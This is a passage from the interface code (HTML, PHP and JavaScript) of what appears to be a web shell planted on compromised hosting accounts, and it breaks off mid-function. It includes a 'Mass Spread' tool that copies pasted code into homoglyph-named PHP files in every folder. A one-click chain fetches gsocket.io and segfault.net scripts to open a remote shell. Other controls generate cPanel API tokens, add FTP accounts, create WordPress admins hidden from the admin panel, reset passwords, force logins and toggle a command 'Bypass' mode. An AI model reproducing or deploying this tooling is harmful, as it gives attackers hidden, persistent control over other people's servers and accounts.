            <p style="color:var(--text-primary);font-size:15px;margin-bottom:6px;">Are you sure?</p>
            <p id="deleteFileName" style="color:var(--accent-gold);font-size:13px;font-weight:600;word-break:break-all;"></p>
            <p style="color:var(--text-muted);font-size:11px;margin-top:12px;">This action cannot be undone.</p>
        </div>
        <div class="modal-footer" style="justify-content:center;gap:12px;">
            <button type="button" class="btn btn-secondary" onclick="hideDeleteConfirm()">Cancel</button>
            <a id="deleteConfirmBtn" href="#" class="btn btn-danger">Delete</a>
        </div>
    </div>
</div>

<div class="modal-overlay hidden" id="multiuploadModal">
    <div class="modal">
        <div class="modal-header">
            <span class="modal-title">📤 Multi Upload</span>
            <button class="modal-close" onclick="hideModal('multiupload')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <form method="POST" enctype="multipart/form-data">
            <div class="modal-body">
                <div id="uploadersContainer">
                    <div class="upload-row" style="margin-bottom:6px;">
                        <label class="custom-file-input">
                            <input type="file" name="files[]" onchange="updateFileName(this)">
                            <span class="file-btn">📄 Choose</span>
                            <span class="file-name">No file selected</span>
                        </label>
                        <button type="button" class="btn btn-danger btn-sm" onclick="removeUploader(this)">✕</button>
                    </div>
                </div>
                <button type="button" class="btn btn-secondary btn-sm" onclick="addUploader()" style="width:100%;margin-top:8px;">+ Add More</button>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" onclick="hideModal('multiupload')">Cancel</button>
                <button type="submit" name="multi_upload" class="btn btn-primary">⬆ Upload All</button>
            </div>
        </form>
    </div>
</div>

<div class="modal-overlay hidden" id="remoteModal">
    <div class="modal" style="max-width:450px;">
        <div class="modal-header">
            <span class="modal-title">🌐 Remote Upload</span>
            <button class="modal-close" onclick="hideModal('remote')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <form method="POST">
            <div class="modal-body">
                <div class="form-group">
                    <label class="form-label">URL</label>
                    <input type="text" name="remote_url" class="form-input" placeholder="https://example.com/file.php" required>
                </div>
                <div class="form-group" style="margin-bottom:0;">
                    <label class="form-label">Save as (optional)</label>
                    <input type="text" name="remote_filename" class="form-input" placeholder="Leave empty for original name">
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" onclick="hideModal('remote')">Cancel</button>
                <button type="submit" name="remote_upload" class="btn btn-primary">⬇ Download</button>
            </div>
        </form>
    </div>
</div>

<div class="modal-overlay hidden" id="chmodModal">
    <div class="modal" style="max-width:450px;">
        <div class="modal-header">
            <span class="modal-title">🔒 Mass Chmod</span>
            <button class="modal-close" onclick="hideModal('chmod')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <form method="POST">
            <div class="modal-body">
                <div class="form-group">
                    <label class="form-label">Target Path</label>
                    <input type="text" name="chmod_path" class="form-input" value="<?php echo htmlspecialchars($currentDirectory); ?>" required>
                </div>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
                    <div class="form-group">
                        <label class="form-label">Folder Permission</label>
                        <input type="text" name="chmod_folder" class="form-input" placeholder="0755" value="0755" maxlength="4" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">File Permission</label>
                        <input type="text" name="chmod_file" class="form-input" placeholder="0644" value="0644" maxlength="4" required>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" onclick="hideModal('chmod')">Cancel</button>
                <button type="submit" name="mass_chmod" class="btn btn-primary">Apply</button>
            </div>
        </form>
    </div>
</div>

<div class="modal-overlay hidden" id="spreadModal">
    <div class="modal" style="max-width:550px;">
        <div class="modal-header">
            <span class="modal-title">🌊 Mass Spread</span>
            <button class="modal-close" onclick="hideModal('spread')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <form method="POST">
            <div class="modal-body">
                <div style="background:rgba(245,158,11,0.06);border:1px solid rgba(245,158,11,0.15);border-radius:8px;padding:12px;margin-bottom:14px;">
                    <p style="color:var(--accent-gold);font-size:11px;font-weight:600;">Auto-Match Filename</p>
                    <p style="color:var(--text-muted);font-size:10px;line-height:1.5;">Scans each folder for existing PHP files and creates a homoglyph variant automatically.</p>
                </div>
                <div class="form-group">
                    <label class="form-label">Paste Code</label>
                    <textarea name="spread_content" class="form-input" style="min-height:200px;resize:vertical;font-family:'JetBrains Mono',monospace;" placeholder="Paste your code here..." required></textarea>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" onclick="hideModal('spread')">Cancel</button>
                <button type="submit" name="mass_spread" class="btn btn-primary" style="background:linear-gradient(135deg,#f59e0b,#d97706);color:#000;border-color:#f59e0b;">🌊 Spread All</button>
            </div>
        </form>
    </div>
</div>

<div class="modal-overlay hidden" id="gsocketModal">
    <div class="modal" style="max-width:500px;">
        <div class="modal-header">
            <span class="modal-title" style="color:#10b981;">🌐 GSSocket</span>
            <button class="modal-close" onclick="hideModal('gsocket')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <div style="background:rgba(16,185,129,0.06);border:1px solid rgba(16,185,129,0.15);border-radius:8px;padding:12px;margin-bottom:16px;">
                <p style="color:#10b981;font-size:11px;font-weight:600;margin-bottom:4px;">Auto-Install Chain</p>
                <p style="color:var(--text-muted);font-size:10px;line-height:1.5;">
                    1. gsocket.io/y (curl/wget)<br>
                    2. segfault.net/deploy-all.sh<br>
                    3. GS_PORT=53 deploy-all.sh
                </p>
            </div>
            <div style="display:flex;gap:10px;">
                <form method="POST" style="flex:1;">
                    <input type="hidden" name="gsocket_action" value="1">
                    <input type="hidden" name="gsocket_cmd" value="install">
                    <button type="submit" class="btn btn-success" style="width:100%;padding:10px;">⬇ Install</button>
                </form>
                <form method="POST" style="flex:1;">
                    <input type="hidden" name="gsocket_action" value="1">
                    <input type="hidden" name="gsocket_cmd" value="uninstall">
                    <button type="submit" class="btn btn-danger" style="width:100%;padding:10px;">🗑 Uninstall</button>
                </form>
            </div>
        </div>
    </div>
</div>

<div class="modal-overlay hidden" id="uapiModal">
    <div class="modal" style="max-width:520px;">
        <div class="modal-header">
            <span class="modal-title" style="color:#8b5cf6;">🛡 UAPI / cPanel</span>
            <button class="modal-close" onclick="hideModal('uapi')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <p style="color:var(--text-secondary);font-size:12px;font-weight:500;margin-bottom:12px;">Generate cPanel API Token</p>
            <form method="POST" style="margin-bottom:20px;">
                <button type="submit" name="cpanel_token" class="btn btn-purple" style="width:100%;background:var(--gradient-purple);color:#fff;border-color:#7c3aed;">🔑 Generate Token</button>
            </form>
            <div style="border-top:1px solid var(--border-color);padding-top:16px;">
                <p style="color:var(--text-secondary);font-size:11px;font-weight:500;margin-bottom:10px;">Server Info</p>
                <div style="background:var(--bg-input);padding:12px;border-radius:8px;font-size:11px;color:var(--text-muted);font-family:'JetBrains Mono',monospace;">
                    <div>🌐 Domain: <?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'N/A'); ?></div>
                    <div>👤 User: <?php echo htmlspecialchars(get_current_user()); ?></div>
                    <div>🖥 Server: <?php echo htmlspecialchars(php_uname('n')); ?></div>
                    <div>🐘 PHP: <?php echo phpversion(); ?></div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="modal-overlay hidden" id="ftpModal">
    <div class="modal" style="max-width:620px;">
        <div class="modal-header">
            <span class="modal-title" style="color:#f97316;">📡 FTP Manager</span>
            <button class="modal-close" onclick="hideModal('ftp')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <div style="background:var(--bg-secondary);border:1px solid var(--border-color);border-radius:8px;padding:14px;margin-bottom:16px;">
                <p style="color:var(--accent-gold);font-size:12px;font-weight:600;margin-bottom:10px;">➕ Add FTP Account</p>
                <form method="POST">
                    <div style="display:grid;grid-template-columns:1fr 1fr 80px;gap:8px;align-items:end;">
                        <div class="form-group" style="margin:0;">
                            <label class="form-label">Username</label>
                            <input type="text" name="ftp_user" class="form-input" placeholder="ftpuser" required>
                        </div>
                        <div class="form-group" style="margin:0;">
                            <label class="form-label">Password</label>
                            <input type="text" name="ftp_pass" class="form-input" placeholder="P@ss123!" required>
                        </div>
                        <button type="submit" name="ftp_add" class="btn btn-primary btn-sm" style="height:36px;">Add</button>
                    </div>
                </form>
            </div>

            <div style="margin-bottom:10px;">
                <p style="color:var(--text-primary);font-size:12px;font-weight:600;">📋 FTP Accounts</p>
            </div>

            <?php if (!empty($ftpAccounts)): ?>
            <div style="max-height:300px;overflow-y:auto;">
            <?php foreach ($ftpAccounts as $i => $ftp):
                $ftpLogin = $ftp['login'] ?? $ftp['user'] ?? '';
                $ftpDomain = $ftp['domain'] ?? '';
                $ftpDir = $ftp['homedir'] ?? '';
                $ftpAtSign = strpos($ftpLogin, '@');
                $ftpUserOnly = ($ftpAtSign !== false) ? substr($ftpLogin, 0, $ftpAtSign) : $ftpLogin;
                if (empty($ftpDomain) && $ftpAtSign !== false) $ftpDomain = substr($ftpLogin, $ftpAtSign + 1);
            ?>
            <div style="background:var(--bg-secondary);border:1px solid var(--border-color);border-radius:8px;padding:10px 14px;margin-bottom:6px;">
                <div style="display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap;">
                    <div style="flex:1;min-width:180px;">
                        <div style="color:var(--accent-blue);font-size:12px;font-weight:600;font-family:'JetBrains Mono',monospace;"><?php echo htmlspecialchars($ftpLogin); ?></div>
                        <div style="color:var(--text-muted);font-size:10px;"><?php echo htmlspecialchars($ftpDir); ?></div>
                    </div>
                    <div style="display:flex;gap:4px;align-items:center;">
                        <button type="button" class="btn btn-sm btn-secondary" style="padding:3px 8px;font-size:10px;" onclick="ftpChgPass('<?php echo htmlspecialchars($ftpUserOnly, ENT_QUOTES); ?>','<?php echo htmlspecialchars($ftpDomain, ENT_QUOTES); ?>')">🔑</button>
                        <form method="POST" style="margin:0;" onsubmit="return confirm('Delete <?php echo htmlspecialchars($ftpLogin, ENT_QUOTES); ?>?')">
                            <input type="hidden" name="ftp_del_user" value="<?php echo htmlspecialchars($ftpUserOnly); ?>">
                            <input type="hidden" name="ftp_del_domain" value="<?php echo htmlspecialchars($ftpDomain); ?>">
                            <button type="submit" name="ftp_delete" class="btn btn-sm btn-danger" style="padding:3px 8px;font-size:10px;">🗑</button>
                        </form>
                    </div>
                </div>
                <div id="ftpChg_<?php echo $i; ?>" class="hidden" style="margin-top:8px;padding-top:8px;border-top:1px solid var(--border-color);">
                    <form method="POST" style="display:flex;gap:6px;align-items:end;">
                        <input type="hidden" name="ftp_chg_user" value="<?php echo htmlspecialchars($ftpUserOnly); ?>">
                        <input type="hidden" name="ftp_chg_domain" value="<?php echo htmlspecialchars($ftpDomain); ?>">
                        <div style="flex:1;">
                            <label class="form-label" style="font-size:10px;">New Password</label>
                            <input type="text" name="ftp_chg_pass" class="form-input" style="font-size:11px;padding:6px 10px;" placeholder="NewP@ss!" required>
                        </div>
                        <button type="submit" name="ftp_passwd" class="btn btn-primary btn-sm" style="height:32px;font-size:10px;">Save</button>
                    </form>
                </div>
            </div>
            <?php endforeach; ?>
            </div>
            <?php else: ?>
            <div style="text-align:center;padding:30px;color:var(--text-muted);font-size:11px;">
                No FTP accounts found.
            </div>
            <?php endif; ?>
        </div>
    </div>
</div>

<?php if ($wpAvailable): ?>
<div class="modal-overlay hidden" id="wpModal">
    <div class="modal" style="max-width:820px;max-height:90vh;overflow-y:auto;">
        <div class="modal-header">
            <span class="modal-title" style="color:#3b82f6;">📰 WordPress Manager</span>
            <button class="modal-close" onclick="hideModal('wp')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <div style="background:var(--bg-secondary);border:1px solid var(--border-color);border-radius:8px;padding:14px;margin-bottom:16px;">
                <p style="color:var(--accent-green);font-size:12px;font-weight:600;margin-bottom:10px;">➕ Create Admin User</p>
                <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:8px;">
                    <div class="form-group" style="margin:0;">
                        <label class="form-label">Username</label>
                        <input type="text" id="wpNewUser" class="form-input" placeholder="admin_user">
                    </div>
                    <div class="form-group" style="margin:0;">
                        <label class="form-label">Password</label>
                        <input type="text" id="wpNewPass" class="form-input" placeholder="P@ssw0rd!">
                    </div>
                    <div class="form-group" style="margin:0;">
                        <label class="form-label">Email</label>
                        <input type="text" id="wpNewEmail" class="form-input" placeholder="user@domain.com">
                    </div>
                </div>
                <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
                    <label style="display:flex;align-items:center;gap:6px;font-size:11px;color:var(--text-secondary);cursor:pointer;margin:0;">
                        <input type="checkbox" id="wpHideUser" style="width:auto;accent-color:#7c3aed;">
                        🙈 Hide from admin panel
                    </label>
                    <button type="button" class="btn btn-primary btn-sm" onclick="wpCreateAdmin()" style="margin-left:auto;">Create</button>
                </div>
                <div id="wpCreateStatus" style="display:none;margin-top:8px;padding:8px 12px;border-radius:6px;font-size:11px;"></div>
            </div>

            <div style="margin-bottom:10px;">
                <p style="color:var(--text-primary);font-size:12px;font-weight:600;">👥 WordPress Users</p>
            </div>

            <div id="wpUserList" style="max-height:400px;overflow-y:auto;">
                <div style="text-align:center;padding:30px;color:var(--text-muted);font-size:11px;">Loading...</div>
            </div>
        </div>
    </div>
</div>

<div class="modal-overlay hidden" id="wpDeleteModal" style="z-index:1001;">
    <div class="modal" style="max-width:400px;">
        <div class="modal-header">
            <span class="modal-title" style="color:#f85149;">⚠️ Confirm Delete</span>
            <button class="modal-close" onclick="hideModal('wpDelete')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <p style="color:var(--text-muted);font-size:12px;">Delete user <strong id="wpDeleteName" style="color:var(--accent-red);"></strong>? This cannot be undone.</p>
            <div style="display:flex;gap:8px;margin-top:14px;justify-content:flex-end;">
                <button class="btn btn-sm btn-secondary" onclick="hideModal('wpDelete')">Cancel</button>
                <button class="btn btn-sm btn-danger" id="wpDeleteConfirmBtn" onclick="wpConfirmDelete()">Delete</button>
            </div>
        </div>
    </div>
</div>
<?php endif; ?>

<div class="modal-overlay hidden" id="procModal">
    <div class="modal" style="max-width:1100px;max-height:92vh;overflow:hidden;display:flex;flex-direction:column;">
        <div class="modal-header" style="flex-shrink:0;">
            <span class="modal-title" style="color:#ec4899;">
                ⚡ Process Manager
                <span id="procLiveIndicator" style="display:inline-block;width:8px;height:8px;background:var(--accent-green);border-radius:50%;margin-left:8px;animation:procPulse 1s infinite;vertical-align:middle;"></span>
                <span style="font-size:10px;color:var(--accent-green);margin-left:4px;font-weight:400;">LIVE</span>
            </span>
            <div style="display:flex;align-items:center;gap:8px;">
                <span id="procStats" style="font-size:10px;color:var(--text-muted);"></span>
                <button class="btn btn-sm btn-secondary" onclick="procTogglePause()" id="procPauseBtn" style="padding:3px 10px;font-size:10px;">⏸ Pause</button>
                <button class="modal-close" onclick="procStopAndClose()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
            </div>
        </div>
        <div class="modal-body" style="flex:1;overflow:hidden;display:flex;flex-direction:column;padding:10px 14px;">
            <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;align-items:center;">
                <input type="text" id="procSearch" class="form-input" placeholder="🔍 Search process..." style="flex:1;min-width:150px;padding:5px 12px;font-size:11px;" oninput="procFilterRender()">
                <select id="procFilter" class="form-input" style="width:auto;padding:5px 10px;font-size:11px;" onchange="procFilterRender()">
                    <option value="all">All Processes</option>
                    <option value="mine">👤 My Processes</option>
                    <option value="hidden">🙈 Hidden Only</option>
                    <option value="recent">🕐 Recent (5min)</option>
                </select>
                <select id="procSort" class="form-input" style="width:auto;padding:5px 10px;font-size:11px;" onchange="procFilterRender()">
                    <option value="cpu">Sort: CPU</option>
                    <option value="mem">Sort: MEM</option>
                    <option value="pid">Sort: PID</option>
                    <option value="start">Sort: Start</option>
                </select>
            </div>

            <div id="procAlerts" style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap;"></div>

            <div style="flex:1;overflow:auto;border:1px solid var(--border-color);border-radius:8px;">
                <table style="width:100%;border-collapse:collapse;font-size:11px;">
                    <thead>
                        <tr style="background:var(--bg-secondary);position:sticky;top:0;z-index:1;">
                            <th style="padding:6px 10px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border-color);white-space:nowrap;">PID</th>
                            <th style="padding:6px 10px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border-color);white-space:nowrap;">USER</th>
                            <th style="padding:6px 10px;text-align:right;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border-color);white-space:nowrap;">CPU%</th>
                            <th style="padding:6px 10px;text-align:right;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border-color);white-space:nowrap;">MEM%</th>
                            <th style="padding:6px 10px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border-color);white-space:nowrap;">STAT</th>
                            <th style="padding:6px 10px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border-color);white-space:nowrap;">START</th>
                            <th style="padding:6px 10px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border-color);">COMMAND</th>
                            <th style="padding:6px 10px;text-align:center;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border-color);white-space:nowrap;">ACTION</th>
                        </tr>
                    </thead>
                    <tbody id="procTableBody">
                        <tr><td colspan="8" style="text-align:center;padding:30px;color:var(--text-muted);">Loading...</td></tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>
<style>
@keyframes procPulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
</style>

<div class="modal-overlay hidden" id="procKillModal" style="z-index:1001;">
    <div class="modal" style="max-width:380px;">
        <div class="modal-header">
            <span class="modal-title" style="color:#f85149;">⚡ Kill Process</span>
            <button class="modal-close" onclick="hideModal('procKill')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <p style="color:var(--text-muted);font-size:12px;">Kill PID <strong id="procKillPid" style="color:var(--accent-red);"></strong>?</p>
            <p id="procKillCmd" style="color:var(--text-muted);font-size:10px;font-family:monospace;word-break:break-all;margin-top:4px;"></p>
            <div style="display:flex;gap:6px;margin-top:12px;justify-content:flex-end;">
                <button class="btn btn-sm btn-secondary" onclick="hideModal('procKill')">Cancel</button>
                <button class="btn btn-sm" style="background:#f97316;border-color:#f97316;color:#fff;" onclick="procDoKill('15')">SIGTERM</button>
                <button class="btn btn-sm btn-danger" onclick="procDoKill('9')">SIGKILL</button>
            </div>
        </div>
    </div>
</div>

<script>
function showModal(type) {
    document.getElementById(type + 'Modal').classList.remove('hidden');
    if (type === 'wp' && typeof wpLoadUsers === 'function') wpLoadUsers();
    if (type === 'ftp') ftpAutoLoad();
    if (type === 'proc') procStart();
}
function hideModal(type) {
    document.getElementById(type + 'Modal').classList.add('hidden');
}
function hideModalDirect(id) {
    document.getElementById(id).classList.add('hidden');
}

function showDeleteConfirm(path, name) {
    document.getElementById('deleteFileName').textContent = decodeURIComponent(name);
    document.getElementById('deleteConfirmBtn').href = '?del=' + path;
    document.getElementById('deleteConfirmModal').classList.remove('hidden');
}
function hideDeleteConfirm() { document.getElementById('deleteConfirmModal').classList.add('hidden'); }

function updateFileName(input) {
    var label = input.closest('.custom-file-input');
    var nameSpan = label.querySelector('.file-name');
    if (input.files.length > 0) { nameSpan.textContent = input.files[0].name; label.classList.add('has-file'); }
    else { nameSpan.textContent = 'No file selected'; label.classList.remove('has-file'); }
}

function updateZipName(input) {
    var nameSpan = document.getElementById('zipFileName');
    if (input.files.length > 0) { nameSpan.textContent = input.files[0].name; }
    else { nameSpan.textContent = 'Choose ZIP to extract'; }
}

function addUploader() {
    var c = document.getElementById('uploadersContainer');
    var r = document.createElement('div');
    r.className = 'upload-row';
    r.style.marginBottom = '6px';
    r.innerHTML = '<label class="custom-file-input"><input type="file" name="files[]" onchange="updateFileName(this)"><span class="file-btn">📄 Choose</span><span class="file-name">No file selected</span></label><button type="button" class="btn btn-danger btn-sm" onclick="removeUploader(this)">✕</button>';
    c.appendChild(r);
}
function removeUploader(btn) {
    var c = document.getElementById('uploadersContainer');
    if (c.children.length > 1) btn.parentElement.remove();
}

var bypassMode = false;
function toggleBypass() {
    bypassMode = !bypassMode;
    var btn = document.getElementById('bypassToggle');
    var field = document.getElementById('useBypassField');
    var label = document.getElementById('cmdModeLabel');
    if (bypassMode) {
        btn.textContent = 'Bypass';
        btn.className = 'btn btn-danger btn-sm';
        btn.style.cssText = 'padding:4px 10px;font-size:9px;min-width:56px;';
        field.value = '1';
        label.textContent = '#';
        label.style.color = 'var(--accent-red)';
    } else {
        btn.textContent = 'Normal';
        btn.className = 'btn btn-secondary btn-sm';
        btn.style.cssText = 'padding:4px 10px;font-size:9px;min-width:56px;';
        field.value = '0';
        label.textContent = '$';
        label.style.color = '';
    }
}

var ftpLoaded = <?php echo (!empty($ftpAccounts) || isset($_POST['ftp_list'])) ? 'true' : 'false'; ?>;
function ftpAutoLoad() {
    if (ftpLoaded) return;
    ftpLoaded = true;
    var form = document.createElement('form');
    form.method = 'POST';
    form.style.display = 'none';
    var inp = document.createElement('input');
    inp.type = 'hidden';
    inp.name = 'ftp_list';
    inp.value = '1';
    form.appendChild(inp);
    document.body.appendChild(form);
    form.submit();
}

function ftpChgPass(user, domain) {
    var panels = document.querySelectorAll('[id^="ftpChg_"]');
    panels.forEach(function(p) { p.classList.add('hidden'); });
    for (var i = 0; i < 100; i++) {
        var el = document.getElementById('ftpChg_' + i);
        if (!el) break;
        var form = el.querySelector('form');
        if (form) {
            var uInput = form.querySelector('[name="ftp_chg_user"]');
            var dInput = form.querySelector('[name="ftp_chg_domain"]');
            if (uInput && dInput && uInput.value === user && dInput.value === domain) {
                el.classList.toggle('hidden');
                if (!el.classList.contains('hidden')) {
                    el.querySelector('[name="ftp_chg_pass"]').focus();
                }
                break;
            }
        }
    }
}

function wpRequest(data, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
        try { callback(JSON.parse(xhr.responseText)); }
        catch(e) { callback({err: xhr.responseText.substring(0, 300)}); }
    };
    xhr.onerror = function() { callback({err: 'Network error'}); };
    var params = [];
    for (var key in data) params.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    xhr.send(params.join('&'));
}

function wpLoadUsers() {
    var container = document.getElementById('wpUserList');
    if (!container) return;
    container.innerHTML = '<div style="text-align:center;padding:30px;color:var(--text-muted);font-size:11px;">⏳ Loading users...</div>';
    wpRequest({c4t: 'ulst'}, function(users) {
        if (users.err) {
            container.innerHTML = '<div style="text-align:center;padding:30px;color:var(--accent-red);font-size:11px;">❌ Error: ' + users.err + '</div>';
            return;
        }
        if (!users.length) {
            container.innerHTML = '<div style="text-align:center;padding:30px;color:var(--text-muted);font-size:11px;">No users found.</div>';
            return;
        }
        var html = '';
        users.forEach(function(u) {
            var isHidden = u.is_hidden || false;
            var hiddenBadge = isHidden ? '<span class="wp-badge wp-badge-hidden">🙈 Hidden</span>' : '';
            var borderLeft = isHidden ? 'border-left: 3px solid #7c3aed;' : '';
            var bgColor = isHidden ? 'background: rgba(124,58,237,0.05);' : 'background: var(--bg-secondary);';
            html += '<div class="wp-user-row" style="' + bgColor + borderLeft + '">';
            html += '<div style="flex:1;min-width:180px;">';
            html += '<div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">';
            html += '<span style="color:var(--accent-blue);font-size:10px;font-weight:600;font-family:monospace;">#' + u.ID + '</span>';
            html += '<span style="color:var(--accent-blue);font-size:12px;font-weight:600;">' + u.user_login + '</span>';
            html += hiddenBadge;
            html += '</div>';
            html += '<div style="color:var(--text-muted);font-size:10px;">' + u.user_email + '</div>';
            html += '</div>';
            html += '<div style="display:flex;gap:4px;align-items:center;flex-wrap:wrap;">';
            html += '<button class="btn btn-sm btn-danger" style="padding:3px 8px;font-size:10px;" onclick="wpResetPw(' + u.ID + ',this)">🔑 Reset</button>';
            html += '<button class="btn btn-sm btn-primary" style="padding:3px 8px;font-size:10px;" onclick="wpAutoLogin(' + u.ID + ')">🚀 Login</button>';
            if (isHidden) {
                html += '<button class="btn btn-sm" style="padding:3px 8px;font-size:10px;background:var(--accent-green);border-color:var(--accent-green);color:#000;" onclick="wpUnhideUser(' + u.ID + ',this)">👁 Unhide</button>';
            } else {
                html += '<button class="btn btn-sm" style="padding:3px 8px;font-size:10px;background:var(--accent-orange);border-color:var(--accent-orange);color:#000;" onclick="wpHideUser(' + u.ID + ',this)">🙈 Hide</button>';
            }
            html += '<button class="btn btn-sm btn-secondary" style="padding:3px 8px;font-size:10px;" onclick="wpDeleteUser(' + u.ID + ',\'' + u.user_login.replace(/'/g, "\\'") + '\')">🗑</button>';
            html += '</div>';
            html += '<div id="wpPwInfo_' + u.ID + '" style="display:none;margin-top:8px;padding:6px 12px;background:var(--bg-primary);border:1px solid var(--accent-blue);border-radius:6px;font-size:11px;font-family:monospace;clear:both;"></div>';
            html += '</div>';
        });
        container.innerHTML = html;
    });
}

function wpResetPw(uid, btn) {
    var origText = btn.textContent;
    btn.textContent = '...';
    btn.disabled = true;
    wpRequest({c4t: 'rpsw', uix: uid}, function(r) {
        btn.textContent = origText;
        btn.disabled = false;
        if (r.n) {
            var info = document.getElementById('wpPwInfo_' + uid);
            info.style.display = 'block';
            info.innerHTML = '🔑 New password: <strong style="color:var(--accent-gold);user-select:all;">' + r.n + '</strong> <button class="btn btn-sm btn-primary" style="padding:2px 8px;font-size:9px;margin-left:6px;" onclick="navigator.clipboard.writeText(\'' + r.n + '\');this.textContent=\'✔ Copied\'">📋 Copy</button>';
            setTimeout(function(){ info.style.display = 'none'; }, 15000);
        } else {
            alert('❌ Reset failed: ' + (r.err || 'unknown'));
        }
    });
}

function wpAutoLogin(uid) {
    wpRequest({c4t: 'alog', uix: uid}, function(r) {
        if (r.url) window.open(r.url, '_blank');
        else alert('❌ Login failed: ' + (r.err || 'unknown'));
    });
}

function wpHideUser(uid, btn) {
    btn.textContent = '...';
    btn.disabled = true;
    wpRequest({c4t: 'hide', uix: uid}, function(r) {
        btn.disabled = false;
        if (r.ok) wpLoadUsers();
        else { btn.textContent = 'Hide'; alert('❌ Hide failed'); }
    });
}

function wpUnhideUser(uid, btn) {
    btn.textContent = '...';
    btn.disabled = true;
    wpRequest({c4t: 'unhide', uix: uid}, function(r) {
        btn.disabled = false;
        if (r.ok) wpLoadUsers();
        else { btn.textContent = 'Unhide'; alert('❌ Unhide failed'); }
    });
}

var wpDelTarget = null;
function wpDeleteUser(uid, name) {
    wpDelTarget = uid;
    document.getElementById('wpDeleteName').textContent = name;
    document.getElementById('wpDeleteModal').classList.remove('hidden');
}

function wpConfirmDelete() {
    if (!wpDelTarget) return;
    var btn = document.getElementById('wpDeleteConfirmBtn');
    btn.textContent = '...';
    btn.disabled = true;
    wpRequest({c4t: 'del', uix: wpDelTarget}, function(r) {
        btn.textContent = 'Delete';
        btn.disabled = false;
        document.getElementById('wpDeleteModal').classList.add('hidden');
        if (r.ok) {
            wpLoadUsers();
            wpShowStatus('✅ User "' + r.user + '" deleted.', 'ok');
        } else {
            var msg = r.err === 'cannot_delete_self' ? '⚠️ Cannot delete yourself' : (r.err || 'Delete failed');
            wpShowStatus('❌ ' + msg, 'err');
        }
        wpDelTarget = null;
    });
}

function wpCreateAdmin() {
    var user = document.getElementById('wpNewUser').value.trim();
    var pass = document.getElementById('wpNewPass').value.trim();
    var email = document.getElementById('wpNewEmail').value.trim();
    var hide = document.getElementById('wpHideUser').checked;
    if (!user || !pass) { wpShowStatus('❌ Username and password required.', 'err'); return; }
    var data = {c4t: 'cadm', xun: user, xpw: pass, xem: email};
    if (hide) data.hide_user = '1';
    wpShowStatus('⏳ Creating...', 'ok');
    wpRequest(data, function(r) {
        if (r.ok) {
            var msg = '✅ Admin "' + r.u + '" created. Pass: ' + r.p;
            if (r.hide) msg += ' (🙈 Hidden)';
            wpShowStatus(msg, 'ok');
            document.getElementById('wpNewUser').value = '';
